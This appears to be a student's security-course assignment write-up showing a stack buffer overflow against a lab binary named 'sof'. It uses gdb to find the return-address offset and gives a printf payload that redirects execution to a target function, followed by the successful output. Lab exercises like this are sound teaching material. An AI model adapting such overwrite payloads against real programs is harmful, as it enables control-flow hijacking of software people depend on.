### <center><b><h1>Assignment2</h1></b></center>
<center><b>Wonchan Kim 301449586 </b></center>
<h2>Q2</h2>
![[Pasted image 20250925144031.png]]
![[Pasted image 20250925144137.png]]
with gdb debugger, it is possible to get the function address. Need to overflow the buffer with the address of target_function.
![[Pasted image 20250925145859.png]]
setting the breakpoint at the vulnerable function and running
![[Pasted image 20250925152245.png]]
indicates there are 18 bytes difference between the return address of the vulnerable function. 

Hence, 

printf 'AAAAAAAAAAAAAAAAAA\xbb\x11\x40\x00\x00\x00\x00\x00' > p.txt

cat p.txt |./sof
Enter some text: You entered: AAAAAAAAAAAAAAAAAA�@
Yes! You did it!


